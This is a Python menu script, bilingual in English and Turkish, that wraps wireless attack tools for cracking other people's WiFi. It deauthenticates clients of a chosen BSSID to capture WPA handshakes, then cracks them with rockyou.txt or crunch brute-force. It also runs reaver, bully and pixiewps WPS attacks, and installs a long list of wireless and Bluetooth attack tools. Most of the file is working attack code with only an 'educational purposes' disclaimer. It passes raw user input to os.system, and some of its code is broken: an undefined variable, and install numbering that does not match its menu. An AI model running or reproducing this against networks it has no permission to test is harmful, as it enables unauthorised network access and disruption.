# Sadece eğitim amaçlı oluşturulmuştur.
# It is made for educational purposes only.
import os
import subprocess
from subprocess import check_call

RED = "\033[1;31m"
def install_requirements():
    print(f"{RED}\nInstalling Requirements / Gerekli dosyalar indiriliyor.")
    print("\n")
    os.system("apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite")
    os.system("sleep 3 && clear")

def select_language():
    print("Select Language / Dil Seçiniz")
    print("1) English")
    print("2) Türkçe")
    choice = int(input(f"Choice / Seçim: "))
    return choice

def print_menu(lang):
    if lang == 1:
        menu = f"""\033[1;31m
------------------------------------------------------------------
+================================================================+
|__        _____ _____ ___   _   _ _   _ _   _ _____ _____ ____  |
|\ \      / /_ _|  ___|_ _| | | | | | | | \ | |_   _| ____|  _ \ |
| \ \ /\ / / | || |_   | |  | |_| | | | |  \| | | | |  _| | |_) ||
|  \ V  V /  | ||  _|  | |  |  _  | |_| | |\  | | | | |___|  _ < |
|   \_/\_/  |___|_|   |___| |_| |_|\___/|_| \_| |_| |_____|_| \_\|
+================================================================+
                                            Coded By stillhackable
------------------------------------------------------------------                                                                    
(1) Start monitor mode    
(2) Stop monitor mode                      
(3) Scan Networks                     
(4) Getting Handshake (Monitor mode is a must!)                
(5) Crack Handshake with rockyou.txt
(6) Crack Handshake with wordlist
(7) Crack Handshake without wordlist 
(8) Create wordlist                                  
(9) WPS Networks attacks (Bssid And Monitor mode are must!)
(10) Scan for WPS Networks
(11) Install Wireless tools  
(99) About Me
(00) Exit
-------------------------------------------------------------------
"""
    else:
        menu = f"""\033[1;31m
------------------------------------------------------------------
+================================================================+
|__        _____ _____ ___   _   _ _   _ _   _ _____ _____ ____  |
|\ \      / /_ _|  ___|_ _| | | | | | | | \ | |_   _| ____|  _ \ |
| \ \ /\ / / | || |_   | |  | |_| | | | |  \| | | | |  _| | |_) ||
|  \ V  V /  | ||  _|  | |  |  _  | |_| | |\  | | | | |___|  _ < |
|   \_/\_/  |___|_|   |___| |_| |_|\___/|_| \_| |_| |_____|_| \_\|
+================================================================+
                                            Coded By stillhackable
------------------------------------------------------------------                                                                      
(1) Monitor modu başlat    
(2) Monitor modu durdur                      
(3) Ağları tara                     
(4) Handshake yakala  (Monitor modu gereklidir!)  
(5) Handshake'i rockyou.txt ile kır
(6) Handshake'i wordlist ile kır
(7) Handshake'i wordlist olmadan kır 
(8) Wordlist oluştur                                  
(9) WPS Ağ Saldırıları (Bssid ve Monitor modu gereklidir!)
(10) WPS Ağlarını tara
(11) Kablosuz Ağ araçlarını indir                 

(99) Hakkımda
(00) Çıkış
-------------------------------------------------------------------
"""
    print(menu)

def main():
    install_requirements()
    lang = select_language()
    print_menu(lang)

    choice_prompt = "\nEnter your choice: " if lang == 1 else "\nSeçiminizi girin: "
    choice = int(input(choice_prompt))

    if choice == 1:
        interface_prompt = "\nEnter the interface (Default(wlan0/wlan1)): " if lang == 1 else "\nArayüzü girin (Varsayılan(wlan0/wlan1)): "
        run = input(interface_prompt)
        command = "airmon-ng start {} && airmon-ng check kill".format(run)
        os.system(command)
        main()
    elif choice == 2:
        interface_prompt = "\nEnter the interface (Default(wlan0mon/wlan1mon)): " if lang == 1 else "\nArayüzü girin (Varsayılan(wlan0mon/wlan1mon)): "
        run = input(interface_prompt)
        command = "airmon-ng stop {} && service network-manager restart".format(run)
        os.system(command)
        main()
    elif choice == 3:
        interface_prompt = "\nEnter the interface (Default >> (wlan0mon/wlan1mon)): " if lang == 1 else "\nArayüzü girin (Varsayılan >> (wlan0mon/wlan1mon)): "
        run = input(interface_prompt)
        command = "airodump-ng {} -M".format(run)
        print("When Done Press CTRL+C / Bittiğinde CTRL+C basın.")
        os.system("sleep 3")
        os.system(command)
        os.system("sleep 10")
        main()
    elif choice == 4:
        interface_prompt = "\nEnter the interface (Default >> (wlan0mon/wlan1mon)): " if lang == 1 else "\nArayüzü girin (Varsayılan >> (wlan0mon/wlan1mon)): "
        run = input(interface_prompt)
        command = "airodump-ng {} -M".format(run)
        print("When Done Press CTRL+c / Bittiğinde CTRL+c basın.")
        os.system("sleep 7")
        os.system(command)
        bssid_prompt = "\nEnter the bssid of the target: " if lang == 1 else "\nHedefin bssid'sini girin: "
        bssid = input(bssid_prompt)
        channel_prompt = "\nEnter the channel of the network: " if lang == 1 else "\nAğın kanalını girin: "
        channel = int(input(channel_prompt))
        path_prompt = "\nEnter the path of the output file: " if lang == 1 else "\nÇıktı dosyasının yolunu girin: "
        path = input(path_prompt)
        packets_prompt = "\nEnter the number of packets [1-10000] (0 for unlimited ): " if lang == 1 else "\nPaket sayısını girin [1-10000] (sınırsız için 0): "
        packets = int(input(packets_prompt))
        command = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface, bssid, channel, path, packets, bssid, interface)
        os.system(command)
        main()
    elif choice == 11:
        def wire():
            os.system("clear")
            tools_menu = """
1) Aircrack-ng                          17) kalibrate-rtl
2) Asleap                               18) KillerBee
3) Bluelog                              19) Kismet
4) BlueMaho                             20) mdk3
5) Bluepot                              21) mfcuk
6) BlueRanger                           22) mfoc
7) Bluesnarfer                          23) mfterm
8) Bully                                24) Multimon-NG
9) coWPAtty                             25) PixieWPS
10) crackle                             26) Reaver
11) eapmd5pass                          27) redfang
12) Fern Wifi Cracker                   28) airgeddon
13) Ghost Phisher                       29) wifite v2
14) GISKismet                           30) Wifi Honey
15) Wifitap                             31) gr-scan
16) Wifite                              99) Back to main menu

0) Install all wireless tools
"""
            print(tools_menu)
            tool_choice = int(input("Enter The number of the tool: "))
            if tool_choice == 1:
                os.system("sudo apt-get update && apt-get install aircrack-ng")
            elif tool_choice == 2:
                os.system("sudo apt-get update && apt-get install asleep")
            elif tool_choice == 3:
                os.system("sudo apt-get update && apt-get install bluelog")
            elif tool_choice == 4:
                os.system("sudo apt-get update && apt-get install bluemaho")
            elif tool_choice == 5:
                os.system("sudo apt-get update && apt-get install bluepot")
            elif tool_choice == 6:
                os.system("sudo apt-get update && apt-get install blueranger")
            elif tool_choice == 7:
                os.system("sudo apt-get update && apt-get install bluesnarfer")
            elif tool_choice == 8:
                os.system("sudo apt-get update && apt-get install bully")
            elif tool_choice == 9:
                os.system("sudo apt-get update && apt-get install cowpatty")
            elif tool_choice == 10:
                os.system("sudo apt-get update && apt-get install crackle")
            elif tool_choice == 11:
                os.system("sudo apt-get update && apt-get install eapmd5pass")
            elif tool_choice == 12:
                os.system("sudo apt-get update && apt-get install fern-wifi-cracker")
            elif tool_choice == 13:
                os.system("sudo apt-get update && apt-get install ghost-phisher")
            elif tool_choice == 14:
                os.system("sudo apt-get update && apt-get install giskismet")
            elif tool_choice == 15:
                os.system("apt-get install git && git clone git://git.kali.org/packages/gr-scan.git")
            elif tool_choice == 16:
                os.system("sudo apt-get update && apt-get install kalibrate-rtl")
            elif tool_choice == 17:
                os.system("sudo apt-get update && apt-get install killerbee-ng")
            elif tool_choice == 18:
                os.system("sudo apt-get update && apt-get install kismet")
            elif tool_choice == 19:
                os.system("sudo apt-get update && apt-get install mdk3")
            elif tool_choice == 20:
                os.system("sudo apt-get update && apt-get install mfcuk")
            elif tool_choice == 21:
                os.system("sudo apt-get update && apt-get install mfoc")
            elif tool_choice == 22:
                os.system("sudo apt-get update && apt-get install mfterm")
            elif tool_choice == 23:
                os.system("sudo apt-get update && apt-get install multimon-ng")
            elif tool_choice == 24:
                os.system("sudo apt-get update && apt-get install pixiewps")
            elif tool_choice == 25:
                os.system("sudo apt-get update && apt-get install reaver")
            elif tool_choice == 26:
                os.system("sudo apt-get update && apt-get install redfang")
            elif tool_choice == 27:
                os.system("sudo apt-get update && apt-get install rtlsdr-scanner")
            elif tool_choice == 28:
                os.system("sudo apt-get update && apt-get install git && git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git")
            elif tool_choice == 29:
                os.system("sudo apt-get update && apt-get install git && git clone https://github.com/derv82/wifite2.git")
            elif tool_choice == 30:
                os.system("sudo apt-get update && apt-get install wifitap")
            elif tool_choice == 31:
                os.system("sudo apt-get update && apt-get install wifite")
            elif tool_choice == 99:
                main()
            elif tool_choice == 0:
                os.system("apt-get install -y aircrack-ng asleap bluelog blueranger bluesnarfer bully cowpatty crackle eapmd5pass fern-wifi-cracker ghost-phisher giskismet gqrx kalibrate-rtl killerbee kismet mdk3 mfcuk mfoc mfterm multimon-ng pixiewps reaver redfang spooftooph wifi-honey wifitap wifite")
            else:
                print("Not Found / Bulunamadı")
            wire()
        wire()
    elif choice == 99:
        os.system("clear")
        print("""
+=======================================================+
|     _   _ _ _ _                _         _     _      |
| ___| |_(_) | | |__   __ _  ___| | ____ _| |__ | | ___ |
|/ __| __| | | | '_ \ / _` |/ __| |/ / _` | '_ \| |/ _ \|
|\__ \ |_| | | | | | | (_| | (__|   < (_| | |_) | |  __/|
||___/\__|_|_|_|_| |_|\__,_|\___|_|\_\__,_|_.__/|_|\___||
+=======================================================+
LinkedIn: https://www.linkedin.com/in/ardacatalkaya/
E-mail: stillhackable@gmail.com

""")
        quit()
    elif choice == 00:
        exit()
    elif choice == 5:
        if os.path.exists("/usr/share/wordlists/rockyou.txt"):
            path_prompt = "\nEnter the path of the handshake file: " if lang == 1 else "\nHandshake dosya dizinini girin: "
            path = input(path_prompt)
            command = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C / Çıkmak için CTRL+C basın.")
            os.system(command)
            os.system("sleep 5d")
            exit()
        else:
            os.system("gzip -d /usr/share/wordlists/rockyou.txt.gz")
            path_prompt = "\nEnter the path of the handshake file: " if lang == 1 else "\nHandshake dosya dizinini girin: "
            path = input(path_prompt)
            command = "aircrack-ng {} -w /usr/share/wordlists/rockyou.txt".format(path)
            print("\nTo exit Press CTRL +C / Çıkmak için CTRL+C basın.")
            os.system(command)
            os.system("sleep 5d")
            exit()
    elif choice == 6:
        path_prompt = "\nEnter the path of the handshake file: " if lang == 1 else "\nHandshake dosya dizinini girin: "
        path = input(path_prompt)
        wordlist_prompt = "\nEnter the path of the wordlist: " if lang == 1 else "\nWordlist dosya dizinini girin: "
        wordlist = input(wordlist_prompt)
        command = "aircrack-ng {} -w {}".format(path, wordlist)
        os.system(command)
        exit()
    elif choice == 7:
        essid_prompt = "\nEnter the essid of the network: " if lang == 1 else "\nAğın essid'sini girin: "
        essid = input(essid_prompt)
        path_prompt = "\nEnter the path of the handshake file: " if lang == 1 else "\nHandshake dosya dizinini girin: "
        path = input(path_prompt)
        min_len_prompt = "\nEnter the minimum length of the password (8/64): " if lang == 1 else "\nŞifre en az kaç karakter olmalı (8/64): "
        min_len = int(input(min_len_prompt))
        max_len_prompt = "\nEnter the maximum length of the password (8/64): " if lang == 1 else "\nŞifre en fazla kaç karakter olmalı (8/64): "
        max_len = int(input(max_len_prompt))
        charset_menu = """
---------------------------------------------------------------------------------------
(1) Lowercase chars                                (abcdefghijklmnopqrstuvwxyz)
(2) Uppercase chars                                (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
(3) Numeric chars                                  (0123456789)
(4) Symbol chars                                   (!#$%/=?{}[]-*:;)
(5) Lowercase + uppercase chars                    (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ)
(6) Lowercase + numeric chars                      (abcdefghijklmnopqrstuvwxyz0123456789)
(7) Uppercase + numeric chars                      (ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(8) Symbol + numeric chars                         (!#$%/=?{}[]-*:;0123456789)
(9) Lowercase + uppercase + numeric chars          (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789)
(10) Lowercase + uppercase + symbol chars          (abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;)
(11) Lowercase + uppercase + numeric + symbol chars(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;)
(12) Your Own Words and numbers
-----------------------------------------------------------------------------------------
"""
        charset_prompt = "\nEnter your choice here: " if lang == 1 else "\nSeçiminizi buraya girin: "
        print(charset_menu)
        charset_choice = input(charset_prompt)
        charset = ""
        if charset_choice == "1":
            charset = "abcdefghijklmnopqrstuvwxyz"
        elif charset_choice == "2":
            charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        elif charset_choice == "3":
            charset = "0123456789"
        elif charset_choice == "4":
            charset = "!#$%/=?{}[]-*:;"
        elif charset_choice == "5":
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        elif charset_choice == "6":
            charset = "abcdefghijklmnopqrstuvwxyz0123456789"
        elif charset_choice == "7":
            charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        elif charset_choice == "8":
            charset = "!#$%/=?{}[]-*:;0123456789"
        elif charset_choice == "9":
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        elif charset_choice == "10":
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%/=?{}[]-*:;"
        elif charset_choice == "11":
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%/=?{}[]-*:;"
        elif charset_choice == "12":
            charset_prompt = "\nEnter your own words and numbers: " if lang == 1 else "\nKendi kelimelerinizi ve numaralarınızı girin: "
            charset = input(charset_prompt)
        else:
            print("Invalid choice / Geçersiz seçim")
            main()
        command = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(min_len, max_len, charset, path, essid)
        os.system(command)
        print("Copy the password and close the tool / Şifreyi kopyalayın ve aracı kapatın.")
        os.system("sleep 3d")
    elif choice == 8:
        min_len_prompt = "\nEnter the minimum length of the password (8/64): " if lang == 1 else "\nŞifre en az kaç karakter olmalı (8/64): "
        min_len = int(input(min_len_prompt))
        max_len_prompt = "\nEnter the maximum length of the password (8/64): " if lang == 1 else "\nŞifre en fazla kaç karakter olmalı (8/64): "
        max_len = int(input(max_len_prompt))
        path_prompt = "\nEnter the path of the output file: " if lang == 1 else "\nÇıktı dosyasının yolunu girin: "
        path = input(path_prompt)
        content_prompt = "\nEnter what you want the password to contain: " if lang == 1 else "\nŞifrede ne olmasını istiyorsunuz: "
        content = input(content_prompt)
        command = "crunch {} {} {} -o {}".format(min_len, max_len, content, path)
        os.system(command)
        print("The wordlist is saved to {} / Wordlist {} olarak kaydedildi".format(path, path))
    elif choice == 9:
        os.system("clear")
        attack_menu = """
1) Reaver
2) Bully
3) wifite (Recommended)
4) PixieWps

0) Back to Main Menu / Ana menüye dön
"""
        print(attack_menu)
        attack_prompt = "\nChoose the kind of the attack : " if lang == 1 else "\nSaldırı türünü seçin (Harici WIFI Adaptörü Gerekli): "
        attack_choice = int(input(attack_prompt))
        if attack_choice == 1:
            interface_prompt = "\nEnter the interface to start (Default(wlan0mon/wlan1mon)): " if lang == 1 else "\nBaşlatmak için arayüzü girin (Varsayılan(wlan0mon/wlan1mon)): "
            run = input(interface_prompt)
            bssid_prompt = "\nEnter the bssid of the network: " if lang == 1 else "\nAğın bssid'sini girin: "
            bssid = input(bssid_prompt)
            command = "reaver -i {} -b {} -vv".format(run, bssid)
            os.system(command)
            main()
        elif attack_choice == 2:
            interface_prompt = "\nEnter the interface to start (Default(wlan0mon/wlan1mon)): " if lang == 1 else "\nBaşlatmak için arayüzü girin (Varsayılan(wlan0mon/wlan1mon)): "
            run = input(interface_prompt)
            bssid_prompt = "\nEnter the bssid of the network: " if lang == 1 else "\nAğın bssid'sini girin: "
            bssid = input(bssid_prompt)
            channel_prompt = "\nEnter the channel of the network: " if lang == 1 else "\nAğın kanalını girin: "
            channel = int(input(channel_prompt))
            command = "bully -b {} -c {} --pixiewps {}".format(bssid, channel, run)
            os.system(command)
            main()
        elif attack_choice == 3:
            os.system("wifite")
            main()
        elif attack_choice == 4:
            interface_prompt = "\nEnter the interface to start (Default(wlan0mon/wlan1mon)): " if lang == 1 else "\nBaşlatmak için arayüzü girin (Varsayılan(wlan0mon/wlan1mon)): "
            run = input(interface_prompt)
            bssid_prompt = "\nEnter the bssid of the network: " if lang == 1 else "\nAğın bssid'sini girin: "
            bssid = input(bssid_prompt)
            command = "reaver -i {} -b {} -K".format(run, bssid)
            os.system(command)
            main()
        elif attack_choice == 0:
            main()
    elif choice == 10:
        interface_prompt = "\nEnter the interface to start (Default(wlan0mon/wlan1mon)): " if lang == 1 else "\nBaşlatmak için arayüzü girin (Varsayılan(wlan0mon/wlan1mon)): "
        interface = input(interface_prompt)
        command = "airodump-ng -M --wps {}".format(interface)
        os.system(command)
        os.system("sleep 5")
        main()
    else:
        print("Invalid choice / Geçersiz seçim")
        os.system("sleep 2")
        main()

if __name__ == "__main__":
    main()
